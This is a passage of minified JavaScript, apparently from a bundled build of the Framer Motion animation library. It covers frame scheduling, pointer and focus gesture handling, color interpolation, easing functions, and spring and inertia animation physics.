M=Tc(n,T);if(!M)return;const{transitionEnd:A,transition:P,...O}=M;for(const L in O){let N=O[L];if(Array.isArray(N)){const B=y?N.length-1:0;N=N[B]}N!==null&&(c[L]=N)}for(const L in A)c[L]=A[L]}),c}const Ve=n=>n;class eh{constructor(){this.order=[],this.scheduled=new Set}add(r){if(!this.scheduled.has(r))return this.scheduled.add(r),this.order.push(r),!0}remove(r){const o=this.order.indexOf(r);o!==-1&&(this.order.splice(o,1),this.scheduled.delete(r))}clear(){this.order.length=0,this.scheduled.clear()}}function r0(n){let r=new eh,o=new eh,a=0,c=!1,p=!1;const d=new WeakSet,h={schedule:(g,f=!1,y=!1)=>{const v=y&&c,w=v?r:o;return f&&d.add(g),w.add(g)&&v&&c&&(a=r.order.length),g},cancel:g=>{o.remove(g),d.delete(g)},process:g=>{if(c){p=!0;return}if(c=!0,[r,o]=[o,r],o.clear(),a=r.order.length,a)for(let f=0;f<a;f++){const y=r.order[f];y(g),d.has(y)&&(h.schedule(y),n())}c=!1,p&&(p=!1,h.process(g))}};return h}const Zo=["prepare","read","update","preRender","render","postRender"],i0=40;function o0(n,r){let o=!1,a=!0;const c={delta:0,timestamp:0,isProcessing:!1},p=Zo.reduce((v,w)=>(v[w]=r0(()=>o=!0),v),{}),d=v=>p[v].process(c),h=()=>{const v=performance.now();o=!1,c.delta=a?1e3/60:Math.max(Math.min(v-c.timestamp,i0),1),c.timestamp=v,c.isProcessing=!0,Zo.forEach(d),c.isProcessing=!1,o&&r&&(a=!1,n(h))},g=()=>{o=!0,a=!0,c.isProcessing||n(h)};return{schedule:Zo.reduce((v,w)=>{const T=p[w];return v[w]=(M,A=!1,P=!1)=>(o||g(),T.schedule(M,A,P)),v},{}),cancel:v=>Zo.forEach(w=>p[w].cancel(v)),state:c,steps:p}}const{schedule:De,cancel:tn,state:et,steps:Al}=o0(typeof requestAnimationFrame<"u"?requestAnimationFrame:Ve,!0),s0={useVisualState:dg({scrapeMotionValuesFromProps:ug,createRenderState:sg,onMount:(n,r,{renderState:o,latestValues:a})=>{De.read(()=>{try{o.dimensions=typeof r.getBBox=="function"?r.getBBox():r.getBoundingClientRect()}catch{o.dimensions={x:0,y:0,width:0,height:0}}}),De.render(()=>{kc(o,a,{enableHardwareAcceleration:!1},xc(r.tagName),n.transformTemplate),cg(r,o)})}})},a0={useVisualState:dg({scrapeMotionValuesFromProps:Sc,createRenderState:wc})};function l0(n,{forwardMotionProps:r=!1},o,a){return{...vc(n)?s0:a0,preloadedFeatures:o,useRender:Xw(r),createVisualElement:a,Component:n}}function Zt(n,r,o,a={passive:!0}){return n.addEventListener(r,o,a),()=>n.removeEventListener(r,o)}const pg=n=>n.pointerType==="mouse"?typeof n.button!="number"||n.button<=0:n.isPrimary!==!1;function xs(n,r="page"){return{point:{x:n[r+"X"],y:n[r+"Y"]}}}const c0=n=>r=>pg(r)&&n(r,xs(r));function Jt(n,r,o,a){return Zt(n,r,c0(o),a)}const u0=(n,r)=>o=>r(n(o)),An=(...n)=>n.reduce(u0);function hg(n){let r=null;return()=>{const o=()=>{r=null};return r===null?(r=n,o):!1}}const th=hg("dragHorizontal"),nh=hg("dragVertical");function fg(n){let r=!1;if(n==="y")r=nh();else if(n==="x")r=th();else{const o=th(),a=nh();o&&a?r=()=>{o(),a()}:(o&&o(),a&&a())}return r}function gg(){const n=fg(!0);return n?(n(),!1):!0}class In{constructor(r){this.isMounted=!1,this.node=r}update(){}}function rh(n,r){const o="pointer"+(r?"enter":"leave"),a="onHover"+(r?"Start":"End"),c=(p,d)=>{if(p.pointerType==="touch"||gg())return;const h=n.getProps();n.animationState&&h.whileHover&&n.animationState.setActive("whileHover",r),h[a]&&De.update(()=>h[a](p,d))};return Jt(n.current,o,c,{passive:!n.getProps()[a]})}class d0 extends In{mount(){this.unmount=An(rh(this.node,!0),rh(this.node,!1))}unmount(){}}class p0 extends In{constructor(){super(...arguments),this.isActive=!1}onFocus(){let r=!1;try{r=this.node.current.matches(":focus-visible")}catch{r=!0}!r||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!0),this.isActive=!0)}onBlur(){!this.isActive||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!1),this.isActive=!1)}mount(){this.unmount=An(Zt(this.node.current,"focus",()=>this.onFocus()),Zt(this.node.current,"blur",()=>this.onBlur()))}unmount(){}}const mg=(n,r)=>r?n===r?!0:mg(n,r.parentElement):!1;function Pl(n,r){if(!r)return;const o=new PointerEvent("pointer"+n);r(o,xs(o))}class h0 extends In{constructor(){super(...arguments),this.removeStartListeners=Ve,this.removeEndListeners=Ve,this.removeAccessibleListeners=Ve,this.startPointerPress=(r,o)=>{if(this.isPressing)return;this.removeEndListeners();const a=this.node.getProps(),p=Jt(window,"pointerup",(h,g)=>{if(!this.checkPressEnd())return;const{onTap:f,onTapCancel:y,globalTapTarget:v}=this.node.getProps();De.update(()=>{!v&&!mg(this.node.current,h.target)?y&&y(h,g):f&&f(h,g)})},{passive:!(a.onTap||a.onPointerUp)}),d=Jt(window,"pointercancel",(h,g)=>this.cancelPress(h,g),{passive:!(a.onTapCancel||a.onPointerCancel)});this.removeEndListeners=An(p,d),this.startPress(r,o)},this.startAccessiblePress=()=>{const r=p=>{if(p.key!=="Enter"||this.isPressing)return;const d=h=>{h.key!=="Enter"||!this.checkPressEnd()||Pl("up",(g,f)=>{const{onTap:y}=this.node.getProps();y&&De.update(()=>y(g,f))})};this.removeEndListeners(),this.removeEndListeners=Zt(this.node.current,"keyup",d),Pl("down",(h,g)=>{this.startPress(h,g)})},o=Zt(this.node.current,"keydown",r),a=()=>{this.isPressing&&Pl("cancel",(p,d)=>this.cancelPress(p,d))},c=Zt(this.node.current,"blur",a);this.removeAccessibleListeners=An(o,c)}}startPress(r,o){this.isPressing=!0;const{onTapStart:a,whileTap:c}=this.node.getProps();c&&this.node.animationState&&this.node.animationState.setActive("whileTap",!0),a&&De.update(()=>a(r,o))}checkPressEnd(){return this.removeEndListeners(),this.isPressing=!1,this.node.getProps().whileTap&&this.node.animationState&&this.node.animationState.setActive("whileTap",!1),!gg()}cancelPress(r,o){if(!this.checkPressEnd())return;const{onTapCancel:a}=this.node.getProps();a&&De.update(()=>a(r,o))}mount(){const r=this.node.getProps(),o=Jt(r.globalTapTarget?window:this.node.current,"pointerdown",this.startPointerPress,{passive:!(r.onTapStart||r.onPointerStart)}),a=Zt(this.node.current,"focus",this.startAccessiblePress);this.removeStartListeners=An(o,a)}unmount(){this.removeStartListeners(),this.removeEndListeners(),this.removeAccessibleListeners()}}const Kl=new WeakMap,El=new WeakMap,f0=n=>{const r=Kl.get(n.target);r&&r(n)},g0=n=>{n.forEach(f0)};function m0({root:n,...r}){const o=n||document;El.has(o)||El.set(o,{});const a=El.get(o),c=JSON.stringify(r);return a[c]||(a[c]=new IntersectionObserver(g0,{root:n,...r})),a[c]}function y0(n,r,o){const a=m0(r);return Kl.set(n,o),a.observe(n),()=>{Kl.delete(n),a.unobserve(n)}}const v0={some:0,all:1};class b0 extends In{constructor(){super(...arguments),this.hasEnteredView=!1,this.isInView=!1}startObserver(){this.unmount();const{viewport:r={}}=this.node.getProps(),{root:o,margin:a,amount:c="some",once:p}=r,d={root:o?o.current:void 0,rootMargin:a,threshold:typeof c=="number"?c:v0[c]},h=g=>{const{isIntersecting:f}=g;if(this.isInView===f||(this.isInView=f,p&&!f&&this.hasEnteredView))return;f&&(this.hasEnteredView=!0),this.node.animationState&&this.node.animationState.setActive("whileInView",f);const{onViewportEnter:y,onViewportLeave:v}=this.node.getProps(),w=f?y:v;w&&w(g)};return y0(this.node.current,d,h)}mount(){this.startObserver()}update(){if(typeof IntersectionObserver>"u")return;const{props:r,prevProps:o}=this.node;["amount","margin","root"].some(w0(r,o))&&this.startObserver()}unmount(){}}function w0({viewport:n={}},{viewport:r={}}={}){return o=>n[o]!==r[o]}const k0={inView:{Feature:b0},tap:{Feature:h0},focus:{Feature:p0},hover:{Feature:d0}};function yg(n,r){if(!Array.isArray(r))return!1;const o=r.length;if(o!==n.length)return!1;for(let a=0;a<o;a++)if(r[a]!==n[a])return!1;return!0}function x0(n){const r={};return n.values.forEach((o,a)=>r[a]=o.get()),r}function S0(n){const r={};return n.values.forEach((o,a)=>r[a]=o.getVelocity()),r}function Ss(n,r,o){const a=n.getProps();return Tc(a,r,o!==void 0?o:a.custom,x0(n),S0(n))}let Cc=Ve;const qn=n=>n*1e3,en=n=>n/1e3,T0={current:!1},vg=n=>Array.isArray(n)&&typeof n[0]=="number";function bg(n){return!!(!n||typeof n=="string"&&wg[n]||vg(n)||Array.isArray(n)&&n.every(bg))}const xi=([n,r,o,a])=>`cubic-bezier(${n}, ${r}, ${o}, ${a})`,wg={linear:"linear",ease:"ease",easeIn:"ease-in",easeOut:"ease-out",easeInOut:"ease-in-out",circIn:xi([0,.65,.55,1]),circOut:xi([.55,0,1,.45]),backIn:xi([.31,.01,.66,-.59]),backOut:xi([.33,1.53,.69,.99])};function kg(n){if(n)return vg(n)?xi(n):Array.isArray(n)?n.map(kg):wg[n]}function C0(n,r,o,{delay:a=0,duration:c,repeat:p=0,repeatType:d="loop",ease:h,times:g}={}){const f={[r]:o};g&&(f.offset=g);const y=kg(h);return Array.isArray(y)&&(f.easing=y),n.animate(f,{delay:a,duration:c,easing:Array.isArray(y)?"linear":y,fill:"both",iterations:p+1,direction:d==="reverse"?"alternate":"normal"})}function A0(n,{repeat:r,repeatType:o="loop"}){const a=r&&o!=="loop"&&r%2===1?0:n.length-1;return n[a]}const xg=(n,r,o)=>(((1-3*o+3*r)*n+(3*o-6*r))*n+3*r)*n,P0=1e-7,E0=12;function I0(n,r,o,a,c){let p,d,h=0;do d=r+(o-r)/2,p=xg(d,a,c)-n,p>0?o=d:r=d;while(Math.abs(p)>P0&&++h<E0);return d}function Bi(n,r,o,a){if(n===r&&o===a)return Ve;const c=p=>I0(p,0,1,n,o);return p=>p===0||p===1?p:xg(c(p),r,a)}const D0=Bi(.42,0,1,1),M0=Bi(0,0,.58,1),Sg=Bi(.42,0,.58,1),R0=n=>Array.isArray(n)&&typeof n[0]!="number",Tg=n=>r=>r<=.5?n(2*r)/2:(2-n(2*(1-r)))/2,Cg=n=>r=>1-n(1-r),Ac=n=>1-Math.sin(Math.acos(n)),Ag=Cg(Ac),N0=Tg(Ac),Pg=Bi(.33,1.53,.69,.99),Pc=Cg(Pg),L0=Tg(Pc),j0=n=>(n*=2)<1?.5*Pc(n):.5*(2-Math.pow(2,-10*(n-1))),B0={linear:Ve,easeIn:D0,easeInOut:Sg,easeOut:M0,circIn:Ac,circInOut:N0,circOut:Ag,backIn:Pc,backInOut:L0,backOut:Pg,anticipate:j0},ih=n=>{if(Array.isArray(n)){Cc(n.length===4);const[r,o,a,c]=n;return Bi(r,o,a,c)}else if(typeof n=="string")return B0[n];return n},Ec=(n,r)=>o=>!!(Li(o)&&Fw.test(o)&&o.startsWith(n)||r&&Object.prototype.hasOwnProperty.call(o,r)),Eg=(n,r,o)=>a=>{if(!Li(a))return a;const[c,p,d,h]=a.match(ks);return{[n]:parseFloat(c),[r]:parseFloat(p),[o]:parseFloat(d),alpha:h!==void 0?parseFloat(h):1}},F0=n=>Pn(0,255,n),Il={...er,transform:n=>Math.round(F0(n))},Kn={test:Ec("rgb","red"),parse:Eg("red","green","blue"),transform:({red:n,green:r,blue:o,alpha:a=1})=>"rgba("+Il.transform(n)+", "+Il.transform(r)+", "+Il.transform(o)+", "+Ci(Ti.transform(a))+")"};function V0(n){let r="",o="",a="",c="";return n.length>5?(r=n.substring(1,3),o=n.substring(3,5),a=n.substring(5,7),c=n.substring(7,9)):(r=n.substring(1,2),o=n.substring(2,3),a=n.substring(3,4),c=n.substring(4,5),r+=r,o+=o,a+=a,c+=c),{red:parseInt(r,16),green:parseInt(o,16),blue:parseInt(a,16),alpha:c?parseInt(c,16)/255:1}}const ql={test:Ec("#"),parse:V0,transform:Kn.transform},Pr={test:Ec("hsl","hue"),parse:Eg("hue","saturation","lightness"),transform:({hue:n,saturation:r,lightness:o,alpha:a=1})=>"hsla("+Math.round(n)+", "+_t.transform(Ci(r))+", "+_t.transform(Ci(o))+", "+Ci(Ti.transform(a))+")"},it={test:n=>Kn.test(n)||ql.test(n)||Pr.test(n),parse:n=>Kn.test(n)?Kn.parse(n):Pr.test(n)?Pr.parse(n):ql.parse(n),transform:n=>Li(n)?n:n.hasOwnProperty("red")?Kn.transform(n):Pr.transform(n)},Le=(n,r,o)=>-o*n+o*r+n;function Dl(n,r,o){return o<0&&(o+=1),o>1&&(o-=1),o<1/6?n+(r-n)*6*o:o<1/2?r:o<2/3?n+(r-n)*(2/3-o)*6:n}function O0({hue:n,saturation:r,lightness:o,alpha:a}){n/=360,r/=100,o/=100;let c=0,p=0,d=0;if(!r)c=p=d=o;else{const h=o<.5?o*(1+r):o+r-o*r,g=2*o-h;c=Dl(g,h,n+1/3),p=Dl(g,h,n),d=Dl(g,h,n-1/3)}return{red:Math.round(c*255),green:Math.round(p*255),blue:Math.round(d*255),alpha:a}}const Ml=(n,r,o)=>{const a=n*n;return Math.sqrt(Math.max(0,o*(r*r-a)+a))},z0=[ql,Kn,Pr],_0=n=>z0.find(r=>r.test(n));function oh(n){const r=_0(n);let o=r.parse(n);return r===Pr&&(o=O0(o)),o}const Ig=(n,r)=>{const o=oh(n),a=oh(r),c={...o};return p=>(c.red=Ml(o.red,a.red,p),c.green=Ml(o.green,a.green,p),c.blue=Ml(o.blue,a.blue,p),c.alpha=Le(o.alpha,a.alpha,p),Kn.transform(c))};function W0(n){var r,o;return isNaN(n)&&Li(n)&&(((r=n.match(ks))===null||r===void 0?void 0:r.length)||0)+(((o=n.match(ng))===null||o===void 0?void 0:o.length)||0)>0}const Dg={regex:jw,countKey:"Vars",token:"${v}",parse:Ve},Mg={regex:ng,countKey:"Colors",token:"${c}",parse:it.parse},Rg={regex:ks,countKey:"Numbers",token:"${n}",parse:er.parse};function Rl(n,{regex:r,countKey:o,token:a,parse:c}){const p=n.tokenised.match(r);p&&(n["num"+o]=p.length,n.tokenised=n.tokenised.replace(r,a),n.values.push(...p.map(c)))}function us(n){const r=n.toString(),o={value:r,tokenised:r,values:[],numVars:0,numColors:0,numNumbers:0};return o.value.includes("var(--")&&Rl(o,Dg),Rl(o,Mg),Rl(o,Rg),o}function Ng(n){return us(n).values}function Lg(n){const{values:r,numColors:o,numVars:a,tokenised:c}=us(n),p=r.length;return d=>{let h=c;for(let g=0;g<p;g++)g<a?h=h.replace(Dg.token,d[g]):g<a+o?h=h.replace(Mg.token,it.transform(d[g])):h=h.replace(Rg.token,Ci(d[g]));return h}}const U0=n=>typeof n=="number"?0:n;function H0(n){const r=Ng(n);return Lg(n)(r.map(U0))}const En={test:W0,parse:Ng,createTransformer:Lg,getAnimatableNone:H0},jg=(n,r)=>o=>`${o>0?r:n}`;function Bg(n,r){return typeof n=="number"?o=>Le(n,r,o):it.test(n)?Ig(n,r):n.startsWith("var(")?jg(n,r):Vg(n,r)}const Fg=(n,r)=>{const o=[...n],a=o.length,c=n.map((p,d)=>Bg(p,r[d]));return p=>{for(let d=0;d<a;d++)o[d]=c[d](p);return o}},G0=(n,r)=>{const o={...n,...r},a={};for(const c in o)n[c]!==void 0&&r[c]!==void 0&&(a[c]=Bg(n[c],r[c]));return c=>{for(const p in a)o[p]=a[p](c);return o}},Vg=(n,r)=>{const o=En.createTransformer(r),a=us(n),c=us(r);return a.numVars===c.numVars&&a.numColors===c.numColors&&a.numNumbers>=c.numNumbers?An(Fg(a.values,c.values),o):jg(n,r)},Mi=(n,r,o)=>{const a=r-n;return a===0?1:(o-n)/a},sh=(n,r)=>o=>Le(n,r,o);function $0(n){return typeof n=="number"?sh:typeof n=="string"?it.test(n)?Ig:Vg:Array.isArray(n)?Fg:typeof n=="object"?G0:sh}function K0(n,r,o){const a=[],c=o||$0(n[0]),p=n.length-1;for(let d=0;d<p;d++){let h=c(n[d],n[d+1]);if(r){const g=Array.isArray(r)?r[d]||Ve:r;h=An(g,h)}a.push(h)}return a}function Og(n,r,{clamp:o=!0,ease:a,mixer:c}={}){const p=n.length;if(Cc(p===r.length),p===1)return()=>r[0];n[0]>n[p-1]&&(n=[...n].reverse(),r=[...r].reverse());const d=K0(r,a,c),h=d.length,g=f=>{let y=0;if(h>1)for(;y<n.length-2&&!(f<n[y+1]);y++);const v=Mi(n[y],n[y+1],f);return d[y](v)};return o?f=>g(Pn(n[0],n[p-1],f)):g}function q0(n,r){const o=n[n.length-1];for(let a=1;a<=r;a++){const c=Mi(0,r,a);n.push(Le(o,1,c))}}function Y0(n){const r=[0];return q0(r,n.length-1),r}function Q0(n,r){return n.map(o=>o*r)}function X0(n,r){return n.map(()=>r||Sg).splice(0,n.length-1)}function ds({duration:n=300,keyframes:r,times:o,ease:a="easeInOut"}){const c=R0(a)?a.map(ih):ih(a),p={done:!1,value:r[0]},d=Q0(o&&o.length===r.length?o:Y0(r),n),h=Og(d,r,{ease:Array.isArray(c)?c:X0(r,c)});return{calculatedDuration:n,next:g=>(p.value=h(g),p.done=g>=n,p)}}function zg(n,r){return r?n*(1e3/r):0}const Z0=5;function _g(n,r,o){const a=Math.max(r-Z0,0);return zg(o-n(a),r-a)}const Nl=.001,J0=.01,ek=10,tk=.05,nk=1;function rk({duration:n=800,bounce:r=.25,velocity:o=0,mass:a=1}){let c,p,d=1-r;d=Pn(tk,nk,d),n=Pn(J0,ek,en(n)),d<1?(c=f=>{const y=f*d,v=y*n,w=y-o,T=Yl(f,d),M=Math.exp(-v);return Nl-w/T*M},p=f=>{const v=f*d*n,w=v*o+o,T=Math.pow(d,2)*Math.pow(f,2)*n,M=Math.exp(-v),A=Yl(Math.pow(f,2),d);return(-c(f)+Nl>0?-1:1)*((w-T)*M)/A}):(c=f=>{const y=Math.exp(-f*n),v=(f-o)*n+1;return-Nl+y*v},p=f=>{const y=Math.exp(-f*n),v=(o-f)*(n*n);return y*v});const h=5/n,g=ok(c,p,h);if(n=qn(n),isNaN(g))return{stiffness:100,damping:10,duration:n};{const f=Math.pow(g,2)*a;return{stiffness:f,damping:d*2*Math.sqrt(a*f),duration:n}}}const ik=12;function ok(n,r,o){let a=o;for(let c=1;c<ik;c++)a=a-n(a)/r(a);return a}function Yl(n,r){return n*Math.sqrt(1-r*r)}const sk=["duration","bounce"],ak=["stiffness","damping","mass"];function ah(n,r){return r.some(o=>n[o]!==void 0)}function lk(n){let r={velocity:0,stiffness:100,damping:10,mass:1,isResolvedFromDuration:!1,...n};if(!ah(n,ak)&&ah(n,sk)){const o=rk(n);r={...r,...o,mass:1},r.isResolvedFromDuration=!0}return r}function Wg({keyframes:n,restDelta:r,restSpeed:o,...a}){const c=n[0],p=n[n.length-1],d={done:!1,value:c},{stiffness:h,damping:g,mass:f,duration:y,velocity:v,isResolvedFromDuration:w}=lk({...a,velocity:-en(a.velocity||0)}),T=v||0,M=g/(2*Math.sqrt(h*f)),A=p-c,P=en(Math.sqrt(h/f)),O=Math.abs(A)<5;o||(o=O?.01:2),r||(r=O?.005:.5);let L;if(M<1){const N=Yl(P,M);L=B=>{const $=Math.exp(-M*P*B);return p-$*((T+M*P*A)/N*Math.sin(N*B)+A*Math.cos(N*B))}}else if(M===1)L=N=>p-Math.exp(-P*N)*(A+(T+P*A)*N);else{const N=P*Math.sqrt(M*M-1);L=B=>{const $=Math.exp(-M*P*B),J=Math.min(N*B,300);return p-$*((T+M*P*A)*Math.sinh(J)+N*A*Math.cosh(J))/N}}return{calculatedDuration:w&&y||null,next:N=>{const B=L(N);if(w)d.done=N>=y;else{let $=T;N!==0&&(M<1?$=_g(L,N,B):$=0);const J=Math.abs($)<=o,H=Math.abs(p-B)<=r;d.done=J&&H}return d.value=d.done?p:B,d}}}function lh({keyframes:n,velocity:r=0,power:o=.8,timeConstant:a=325,bounceDamping:c=10,bounceStiffness:p=500,modifyTarget:d,min:h,max:g,restDelta:f=.5,restSpeed:y}){const v=n[0],w={done:!1,value:v},T=ee=>h!==void 0&&ee<h||g!==void 0&&ee>g,M=ee=>h===void 0?g:g===void 0||Math.abs(h-ee)<Math.abs(g-ee)?h:g;let A=o*r;const P=v+A,O=d===void 0?P:d(P);O!==P&&(A=O-v);const L=ee=>-A*Math.exp(-ee/a),N=ee=>O+L(ee),B=ee=>{const le=L(ee),ve=N(ee);w.done=Math.abs(le)<=f,w.value=w.done?O:ve};let $,J;const H=ee=>{T(w.value)&&($=ee,J=Wg({keyframes:[w.value,M(w.value)],velocity:_g(N,ee,w.value),damping:c,stiffness:p,restDelta:f,restSpeed:y}))};return H(0),{calculatedDuration:null,next:ee=>{let le=!1;return!J&&$===void 0&&(le=!0,B(ee),H(ee)),$!==void 0&&ee>$?J.next(ee-$):(!le&&B(ee),w)}}}const ck=n=>{const r=({timestamp:o})=>n(o);return{start:()=>De.update(r,!0),stop:()=>tn(r),now:()=>et.isProcessing?et.timestamp:performance.now()}},ch=2e4;function uh(n){let r=0;const o=50;let a=n.next(r);for(;!a.done&&r<ch;)r+=o,a=n.next(r);return r>=ch?1/0:r}const uk={decay:lh,inertia:lh,tween:ds,keyframes:ds,spring:Wg};function ps({autoplay:n=!0,delay:r=0,driver:o=ck,keyframes:a,type:c="keyframes",repeat:p=0,repeatDelay:d=0,repeatType:h="loop",onPlay:g,onStop:f,onComplete:y,onUpdate:v,...w}){let T=1,M=!1,A,P;const O=()=>{P=new Promise(S=>{A=S})};O();let L;const N=uk[c]||ds;let B;N!==ds&&typeof a[0]!="number"&&(B=Og([0,100],a,{clamp:!1}),a=[0,100]);const $=N({...w,keyframes:a});let J;h==="mirror"&&(J=N({...w,keyframes:[...a].reverse(),velocity:-(w.velocity||0)}));let H="idle",ee=null,le=null,ve=null;$.calculatedDuration===null&&p&&($.calculatedDuration=uh($));const{calculatedDuration:Ae}=$;let ne=1/0,be=1/0;Ae!==null&&(ne=Ae+d,be=ne*(p+1)-d);let K=0;const ge=S=>{if(le===null)return;T>0&&(le=Math.min(le,S)),T<0&&(le=Math.min(S-be/T,le)),ee!==null?K=ee:K=Math.round(S-le)*T;const j=K-r*(T>=0?1:-1),Z=T>=0?j<0:j>be;K=Math.max(j,0),H==="finished"&&ee===null&&(K=be);let ce=K,fe=$;if(p){const Se=Math.min(K,be)/ne;let Ue=Math.floor(Se),bt=Se%1;!bt&&Se>=1&&(bt=1),bt===1&&Ue--,Ue=Math.min(Ue,p+1),!!(Ue%2)&&(h==="reverse"?(bt=1-bt,d&&(bt-=d/ne)):h==="mirror"&&(fe=J)),ce=Pn(0,1,bt)*ne}const de=Z?{done:!1,value:a[0]}:fe.next(ce);B&&(de.value=B(de.value));let{done:ke}=de;!Z&&Ae!==null&&(ke=T>=0?K>=be:K<=0);const we=ee===null&&(H==="finished"||H==="running"&&ke);return v&&v(de.value),we&&W(),de},ae=()=>{L&&L.stop(),L=void 0},ue=()=>{H="idle",ae(),A(),O(),le=ve=null},W=()=>{H="finished",y&&y(),ae(),A()},q=()=>{if(M)return;L||(L=o(ge));const S=L.now();g&&g(),ee!==null?le=S-ee:(!le||H==="finished")&&(le=S),H==="finished"&&O(),ve=le,ee=null,H="running",L.start()};n&&q();const U={then(S,j){return P.then(S,j)},get time(){return en(K)},set time(S){S=qn(S),K=S,ee!==null||!L||T===0?ee=S:le=L.now()-S/T},get duration(){const S=$.calculatedDuration===null?uh($):$.calculatedDuration;return en(S)},get speed(){return T},set speed(S){S===T||!L||(T=S,U.time=en(K))},get state(){return H},play:q,pause:()=>{H="paused",ee=K},stop:()=>{M=!0,H!=="idle"&&(H="idle",f&&f(),ue())},cancel:()=>{ve!==null&&ge(ve),ue()},complete:()=>{H="finished"},sample:S=>(le=0,ge(S))};return U}function dk(n){let r;return()=>(r===void 0&&(r=n()),r)}const pk=dk(()=>Object.hasOwnProperty.call(Element.prototype,"animate")),hk=new Set(["opacity","clipPath","filter","transform","backgroundColor"]),Jo=10,fk=2e4,gk=(n,r)=>r.type==="spring"||n==="backgroundColor"||!bg(r.ease);function mk(n,r,{onUpdate:o,onComplete:a,...c}){if(!(pk()&&hk.has(r)&&!c.repeatDelay&&c.repeatType!=="mirror"&&c.damping!==0&&c.type!=="inertia"))return!1;let d=!1,h,g,f=!1;const y=()=>{g=new Promise(N=>{h=N})};y();let{keyframes:v,duration:w=300,ease:T,times:M}=c;if(gk(r,c)){const N=ps({...c,repeat:0,delay:0});let B={done:!1,value:v[0]};const $=[];let J=0;for(;!B.done&&J<fk;)B=N.sample(J),$.push(B.value),J+=Jo;M=void 0,v=$,w=J-Jo,T="linear"}const A=C0(n.owner.current,r,v,{...c,duration:w,ease:T,times:M}),P=()=>{f=!1,A.cancel()},O=()=>{f=!0,De.update(P),h(),y()};return A.onfinish=()=>{f||(n.set(A0(v,c)),a&&a(),O())},{then(N,B){return g.then(N,B)},attachTimeline(N){return A.timeline=N,A.onfinish=null,Ve},get time(){return en(A.currentTime||0)},set time(N){A.currentTime=qn(N)},get speed(){return A.playbackRate},set speed(N){A.playbackRate=N},get duration(){return en(w)},play:()=>{d||(A.play(),tn(P))},pause:()=>A.pause(),stop:()=>{if(d=!0,A.playState==="idle")return;const{currentTime:N}=A;if(N){const B=ps({...c,autoplay:!1});n.setWithVelocity(B.sample(N-Jo).value,B.sample(N).value,Jo)}O()},complete:()=>{f||A.finish()},cancel:O}}function yk({keyframes:n,delay:r,onUpdate:o,onComplete:a}){const c=()=>(o&&o(n[n.length-1]),a&&a(),{time:0,speed:1,duration:0,play:Ve,pause:Ve,stop:Ve,then:p=>(p(),Promise.resolve()),cancel:Ve,complete:Ve});return r?ps({keyframes:[0,1],duration:0,delay:r,onComplete:c}):c()}const vk={type:"spring",stiffness:500,damping:25,restSpeed:10},bk=n=>({type:"spring",stiffness:550,damping:n===0?2*Math.sqrt(550):30,restSpeed:10}),wk={type:"keyframes",duration:.8},kk={type:"keyframes",ease:[.25,.1,.35,1],duration:.3},xk=(n,{keyframes:r})=>r.length>2?wk:Jn.has(n)?n.startsWith("scale")?bk(r[1]):vk:kk,Ql=(n,r)=>n==="zIndex"?!1:!!(typeof r=="number"||Array.isArray(r)||typeof r=="string"&&(En.test(r)||r==="0")&&!r.startsWith("url(")),Sk=new Set(["brightness","contrast","saturate","opacity"]);function Tk(n){const[r,o]=n.slice(0,-1).split("(");if(r==="drop-shadow")return n;const[a]=o.match(ks)||[];if(!a)return n;const c=o.replace(a,"");let p=Sk.has(r)?1:0;return a!==o&&(p*=100),r+"("+p+c+")"}const Ck=/([a-z-]*)\(.*?\)/g,Xl={...En,getAnimatableNone:n=>{const r=n.match(Ck);return r?r.map(Tk).join(" "):n}},Ak={...rg,color:it,backgroundColor:it,outlineColor:it,fill:it,stroke:it,borderColor:it,borderTopColor:it,borderRightColor:it,borderBottomColor:it,borderLeftColor:it,filter:Xl,WebkitFilter:Xl},Ic=n=>Ak[n];function Ug(n,r){let o=Ic(n);return o!==Xl&&(o=En),o.getAnimatableNone?o.getAnimatableNone(r):void 0}const Hg=n=>/^0[^.\s]+$/.test(n);function Pk(n){if(typeof n=="number")return n===0;if(n!==null)return n==="none"||n==="0"||Hg(n)}function Ek(n,r,o,a){const c=Ql(r,o);let p;Array.isArray(o)?p=[...o]:p=[null,o];const d=a.from!==void 0?a.from:n.get();let h;const g=[];for(let f=0;f<p.length;f++)p[f]===null&&(p[f]=f===0?d:p[f-1]),Pk(p[f])&&g.push(f),typeof p[f]=="string"&&p[f]!=="none"&&p[f]!=="0"&&(h=p[f]);if(c&&g.length&&h)for(let f=0;f<g.length;f++){const y=g[f];p[y]=Ug(r,h)}return p}function Ik({when:n,delay:r,delayChildren:o,staggerChildren:a,staggerDirection:c,repeat:p,repeatType:d,repeatDelay:h,from:g,elapsed:f,...y}){return!!Object.keys(y).length}function Dc(n,r){return n[r]||n.default||n}const Dk={skipAnimations:!1},Mc=(n,r,o,a={})=>c=>{const p=Dc(a,n)||{},d=p.delay||a.delay||0;let{elapsed:h=0}=a;h=h-qn(d);const g=Ek(r,n,o,p),f=g[0],y=g[g.length-1],v=Ql(n,f),w=Ql(n,y);let T={keyframes:g,velocity:r.getVelocity(),ease:"easeOut",...p,delay:-h,onUpdate:M=>{r.set(M),p.onUpdate&&p.onUpdate(M)},onComplete:()=>{c(),p.onComplete&&p.onComplete()}};if(Ik(p)||(T={...T,...xk(n,T)}),T.duration&&(T.duration=qn(T.duration)),T.repeatDelay&&(T.repeatDelay=qn(T.repeatDelay)),!v||!w||T0.current||p.type===!1||Dk.skipAnimations)return yk(T);if(!a.isHandoff&&r.owner&&r.owner.current instanceof HTMLElement&&!r.owner.getProps().onUpdate){const M=mk(r,n,T);if(M)return M}return ps(T)};function hs(n){return!!(dt(n)&&n.add)}const Gg=n=>/^\-?\d*\.?\d+$/.test(n);function Rc(n,r){n.indexOf(r)===-1&&n.push(r)}function Nc(n,r){const o=n.indexOf(r);o>-1&&n.splice(o,1)}class Lc{constructor(){this.subscriptions=[]}add(r){return Rc(this.subscriptions,r),()=>Nc(this.subscriptions,r)}notify(r,o,a){const c=this.subscriptions.length;if(c)if(c===1)this.subscriptions[0](r,o,a);else for(let p=0;p<c;p++){const d=this.subscriptions[p];d&&d(r,o,a)}}getSize(){return this.subscriptions.length}clear(){this.subscriptions.length=0}}const Mk=n=>!isNaN(parseFloat(n));class 